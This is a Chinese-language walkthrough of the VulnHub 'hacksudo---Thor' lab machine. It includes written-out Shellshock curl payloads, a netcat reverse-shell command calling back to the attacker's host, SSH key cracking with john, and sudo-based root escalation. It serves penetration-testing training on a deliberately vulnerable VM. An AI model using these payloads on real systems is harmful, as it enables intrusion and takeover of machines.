# 第十周

**靶机名称**:**hacksudo---Thor	**

**靶机链接**:https://download.vulnhub.com/hacksudo/hacksudo---Thor.zip

**难度**: *Medium*

**攻击机**:Kali Linux

**使用工具**:nmap、gobuster、john

## 主机发现

`sudo arp-scan -l --interface=eth0`

由于我的kali上有多张网卡,此处使用`--interface`参数指定网卡~

![截屏2022-01-25 下午1.59.12](https://tva1.sinaimg.cn/large/008i3skNly1gypvonk08lj31460awtbw.jpg)

发现靶机ip:`172.20.10.3`

进行nmap扫描

`sudo nmap -p- -sS 172.20.10.3`

`sudo nmap -p22,80 -sV 172.20.10.3`

![截屏2022-01-25 下午2.02.52](https://tva1.sinaimg.cn/large/008i3skNly1gypvsfy28tj318e0p2jy5.jpg)

## web页面

### web探索应用功能

![截屏2022-01-25 下午3.24.19](https://tva1.sinaimg.cn/large/008i3skNly1gypy5hffrmj31c00u0433.jpg)



经典的web应用,看样子像是一个银行网站💰~

我们尝试一下弱口令登陆,失败.

对其他页面进行浏览,发现没有可以交互的点...

![截屏2022-01-25 下午3.26.01](https://tva1.sinaimg.cn/large/008i3skNly1gypy7a5iw5j31c00u07bh.jpg)

在第三个`contact`页面发现了许多人名,尝试作为用户名登录,未果...

简单的应用探索并没有什么发现有趣的东西...让我们再深入些...

### web审阅页面代码

使用`ctrl+u`查看源代码.

![截屏2022-01-25 下午3.28.54](https://tva1.sinaimg.cn/large/008i3skNly1gypy9zrsfoj31c00u0q8n.jpg)

虽然并没有发现直接的漏洞,但是我们找到了`/images`目录.同时看到了一处不显眼的注释

`cgi-bin`

`/cgi-bin`目录中存放了一些脚本,用于处理web服务器向后端发送的数据,通常来说由shell解释器进行解释.

常见的后缀名有`.sh`、`.cgi`

我们查看一下此目录.

![截屏2022-01-25 下午3.32.53](https://tva1.sinaimg.cn/large/008i3skNly1gypye38etvj31c00u0wh2.jpg)

真是浇了一头冷水啊!我好不容易渗透一次,你居然让我403的这么彻底...

不过,请注意:直接访问目录403只代表着web应用不允许直接访问目录列表(`Index Of Directory`),但并不意味着我们不能直接访问其目录下的文件!

也许还是有机会的哦~~

### 目录扫描

web应用没有攻击面怎么办?那一定是信息收集做得不够到位.

接下来我们进行目录扫描,寻找特殊之处~

`dirsearch -u "http://172.20.10.3"`

![截屏2022-01-25 下午3.37.53](https://tva1.sinaimg.cn/large/008i3skNly1gypyjc0w03j31c00u079w.jpg)



看来我们的收获不小:

`README.md`文件?现在你正在阅读的就是"README.md"文件😂.此文件通常用于对程序进行描述与说明,可以当作说明书~

`/admin_login.php`一看就很诱人~管理员登陆的入口就在这里了.

我们还见到了熟悉的老朋友,`/cgi-bin/`与`/images`,这说明有的时候工具与手工审阅要相互结合,工具还是很香的~~

我们访问并下载`README.md`文件

### "敏感信息/源码"泄漏

内容很多,此处提取关键信息:

1.我们找到了此项目的github地址:[link](https://github.com/zakee94/online-banking-system)

2.我们获取到了默认用户与密码`admin/password123`

查看github项目,我们直接获取到了这个项目的全部源代码,如果有需要可以考虑代码审计!

我们还是先来试试这组用户凭据吧~

尝试在`/home.php`页面登陆,失败了.难道是默认密码改变了?

我们再去`/admin_login.php`页面登陆,成功了!我们进入了管理后台!

![截屏2022-01-25 下午3.44.58](https://tva1.sinaimg.cn/large/008i3skNly1gypyqogn0lj31c00u0agj.jpg)

### 后台的探索

可以看到,后台的操作面变得广泛了,我们可以在有数据交互的地方尝试sql注入.但是这个漏洞好像对我们获取shell没有太大帮助...

![截屏2022-01-25 下午3.46.16](https://tva1.sinaimg.cn/large/008i3skNly1gypyrzt67uj31c00u0tdi.jpg)



我们再进入客户信息的管理页面,发现可以直接获取用户的账号名与密码.我们尝试登录一下!

登陆后,我们可以进行用户的转账操作~💰~

在现实中,有不少渗透测试者只注重于技术层面的漏洞,如sql,提权方法等.但是对于企业来说,业务逻辑上的漏洞有时能造成更大的损失.如此案例中,我们可以将用户的钱转到攻击者的账户上,这会给用户造成巨大的经济损失!



![截屏2022-01-25 下午3.47.42](https://tva1.sinaimg.cn/large/008i3skNly1gypytliz30j31c00u0tg7.jpg)

寻找了一番,后台好像也没有什么可以利用的地方了...

### 破壳漏洞

此处为大家介绍一种新的漏洞——破壳漏洞

在shell中,我们可以使用`export var="value"`定义环境变量,使用`funcname(){ statements }`定义函数.

在版本较旧的bash中存在着这么一种漏洞:`export x="(){ :; }; command "`

由于bash的解析问题,当创建环境变量时,变量被定义为一个匿名函数,这个时候后面的`command`会被立即执行.

[详情](https://blog.csdn.net/xiaoshan812613234/article/details/42147955)

同时,在web的`/cgi-bin`下的脚本大多数都是用bash此类的shell解析器进行执行的,所以我们可以利用这个方式执行任意的漏洞.

那么现在的任务就是找到`/cgi-bin`下的脚本并利用啦!

#### 寻找cgi文件

此处分别使用了`gobuster dir -u http://172.20.10.3/cgi-bin/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x cgi,sh`

与`dirsearch -u "http://172.20.10.3/cgi-bin" -e cgi,sh`进行扫描

![截屏2022-01-25 下午4.03.14](https://tva1.sinaimg.cn/large/008i3skNly1gypz9s5zvnj31c00u0wk2.jpg)

![截屏2022-01-25 下午4.04.05](https://tva1.sinaimg.cn/large/008i3skNly1gypzan1847j31c00u0gra.jpg)

结果基本上是一致的,但是gobuster更敏锐的发现了`backup.cgi`.

所以建议大家在扫描目录时多换几个工具与字典,这样才不会遗漏信息!



#### 审查cgi文件

我们打开浏览器进行查看,发现返回了500报错码.

![截屏2022-01-25 下午4.06.10](https://tva1.sinaimg.cn/large/008i3skNly1gypzcpjcoij31c00u0q6y.jpg)

怎么会这样呢?其实不难理解,`/cgi-bin`下的脚本都是用来处理前端发来的数据的,遵循着一定的规则.而我们只是直接地访问,出现异常也是在所难免的.

那么这可怎么利用呢?

这里我们使用nmap的`http-shellshock`脚本进行验证

`nmap -p80 -sV --script http-shellshock --script-args uri=/cgi-bin/shell.sh,cmd=ls 172.20.10.3`

![截屏2022-01-25 下午4.10.42](https://tva1.sinaimg.cn/large/008i3skNly1gypzhhhw5xj31c00u0tf9.jpg)

可以发现,果真验证了漏洞!

那么要如何利用呢?此处给出两种方法

1.百度~

2.使用wireshark查看nc脚本的利用过程.

此处介绍一下第二种.

作为一名渗透测试者,随机应变非常重要.我们很可能遇到许多未知的exp,所以一定要有能力了解未知脚本的运行模式.

![截屏2022-01-25 下午4.18.16](https://tva1.sinaimg.cn/large/008i3skNly1gypzpf6k64j31c00u07f3.jpg)

首先设置`http`协议过滤器,只显示我们想要的内容.

可以看到:左边是nc发送的请求包,其中`User-Agent`等字段被设置为`() { :;}; echo; echo -n orskfpe`,

看到右边是靶机回复的数据,果真执行了相应的命令并返回了`orskfpe`

我们可以由此得出漏洞利用的结构:将请求头设置为`() { :;}; echo; command`的模式.

其原理是什么呢?当我们向`shell.sh`发送了一个http请求时,请求头中的参数会被设置为环境变量.与此同时,我们通过利用bash解析的漏洞进行"破壳",执行我们想要的命令.

在这一过程中,web应用作为"跳板"的角色,承接我们利用bash破壳漏洞的整个过程.

#### 利用破壳漏洞

我们使用`curl`构造特殊的请求包

`curl -H "User-Agent: () { :;}; echo; /bin/bash -c 'which nc'" http://172.20.10.3/cgi-bin/shell.sh`

注意哦,一定要先执行`echo`命令哦

![截屏2022-01-25 下午4.31.59](https://tva1.sinaimg.cn/large/008i3skNly1gyq03jmmcrj31bc0683zj.jpg)

我们成功地执行了命令.接下来就是熟悉的反弹shell环节了!

反弹:`curl -H "User-Agent: () { :;}; echo; /bin/bash -c 'nc -e /bin/bash 172.20.10.11 4444'" http://172.20.10.3/cgi-bin/shell.sh`

升级为交互式:`python3 -c "import pty;pty.spawn('/bin/bash')"`

## 提权

### 神奇小脚本

![截屏2022-01-25 下午4.34.25](https://tva1.sinaimg.cn/large/008i3skNly1gyq0649stsj314u0jyjwf.jpg)

进行简单的查看,发现sudo可以以`thor`用户的权限执行`/home/thor/./hammer.sh`脚本

要注意哦,此处使用sudo要使用`-u`参数指定要以thor用户的身份执行

`sudo -u thor /home/thor/./hammer.sh` 

![截屏2022-01-25 下午4.37.40](https://tva1.sinaimg.cn/large/008i3skNly1gyq09hsgyzj30r60a8q4m.jpg)

执行脚本,发现此处要求我们输入两个内容:第一个内容被照常输出,第二个内容被执行!

看来此处可以以thor用户的权限执行任意shell命令!

再一次执行,我们在第二个输入提交`bash`

![截屏2022-01-25 下午4.39.39](https://tva1.sinaimg.cn/large/008i3skNly1gyq0bkrsvwj30ti0oiwjh.jpg)

完美!再进行交互式shell升级,我们成功获取到了thor用户的权限.

### 回顾历史

执行history命令,我们获得了不少有意思的信息.

![截屏2022-01-25 下午4.42.05](https://tva1.sinaimg.cn/large/008i3skNly1gyq0e5a809j30n0128af6.jpg)

其中有意思的是,它用sudo执行了两个指令`sudo /usr/bin/cat`、`sudo service`.

有了它的提示,我们使用`sudo -l`查看thor账户的sudo权限.

![截屏2022-01-25 下午4.44.17](https://tva1.sinaimg.cn/large/008i3skNly1gyq0gchae8j311a07k40j.jpg)

果然是这样的,我们可以root用户的身份,不需要密码就可以运行这两个命令

接下来有三条思路:

0.读取`/etc/shadow`进行密码爆破,过于耗时,此处我们不推荐也不演示.

1.通过cat读取root用户的ssh私钥,如果root用户设置的ssh登录方式只需要私钥的话我们就可以成功登陆了!

2.搜索有关service的提权方法.

此处推荐一个干货网站:[**GTFOBins**](https://gtfobins.github.io)

可以通过搜索命令/程序查找相对应的**提权向量**(提权方式)

我们先进行第一种尝试吧!

### 1.密钥登陆

![截屏2022-01-25 下午4.53.00](https://tva1.sinaimg.cn/large/008i3skNly1gyq0ph5msxj30wk0rih0b.jpg)

将其中的内容拷贝到我们的kali上,使用`ssh root@172.20.10.3 -i id_rsa`指定密钥登陆

![截屏2022-01-25 下午4.57.07](https://tva1.sinaimg.cn/large/008i3skNly1gyq0ts5f0ij314g0be776.jpg)

难受了,我们遇到了两个问题.

1.id_rsa被掩码加密了.我们必须破解密码

2.登陆同时需要密钥与密码,我们没有密码啊

现在只能寄希望于爆破掩码密码,且root的登陆密码与其一致了!

我们使用`python3 /usr/share/john/ssh2john.py id_rsa > hash`将掩码转化为john可以识别的模式.

使用john进行爆破`john hash --wordlists=~/tools/dict/rockyou.txt`

![截屏2022-01-25 下午5.08.16](https://tva1.sinaimg.cn/large/008i3skNly1gyq15auomnj315k0bk782.jpg)

成功破解出了掩码`1234`

我们尝试一下以`1234`同时作为掩码与root账户的密码进行ssh登陆.

![截屏2022-01-25 下午5.15.13](https://tva1.sinaimg.cn/large/008i3skNly1gyq1clv17zj31tl0u0q5p.jpg)

​	很遗憾,失败了...

### 2.service提权

![截屏2022-01-25 下午4.50.03](https://tva1.sinaimg.cn/large/008i3skNly1gyq0mm8fw7j31b60u079r.jpg)

![截屏2022-01-25 下午4.50.32](https://tva1.sinaimg.cn/large/008i3skNly1gyq0n373gzj31b60u00vm.jpg)

我们打开[GTFOBins](https://gtfobins.github.io)网站,进行搜索,发现了有关`service`程序`sudo`不当配置的提权操作:

我们尝试:`sudo service ../../bin/bash`

![截屏2022-01-25 下午5.05.54](https://tva1.sinaimg.cn/large/008i3skNly1gyq12ut9vxj30m407qwfd.jpg)

**PWN!!**成功获得root权限!

查看`proof.txt`,发现了雷神之锤彩蛋,哈哈哈.

![截屏2022-01-25 下午5.07.20](https://tva1.sinaimg.cn/large/008i3skNly1gyq14fw13pj31c00u0tfc.jpg)



## 总结

在本次打靶中,我们再一次领会到了信息收集的魅力.

前期要想获得突破口是比较困难的,我们通过web目录扫描、查看泄漏的源码等方式成功登入后台,但是却难以获得反弹shell.由于在扫描中发现`/cgi-bin`目录,我们对该目录下的`.sh`、`.cgi`文件进行扫描,并通过nmap下的`http-shellshock`脚本检测到了**破壳漏洞.**

通过wireshark与百度,我们成功利用了破壳漏洞,获得了foothold.接下来的提权环节我们充分利用到了sudo配置的错误,一步一步地提权,获取到thor的权限.

在thor用户下,我们发现了许多奇奇怪怪的文件,但是都没有太大的用处(兔子洞).我们再一次查看`sudo -l`,发现可以执行cat与service.结果cat又是一个兔子洞.最后在在我们的神器——**GTFOBins**的帮助下,我们成功地用service提权!



## 附录

### 引用

[检测cgi-bin漏洞存在方法](https://blog.csdn.net/xiaoshan812613234/article/details/42147955)



### 提权向量在线查询网站:[GTFOBins](https://gtfobins.github.io)





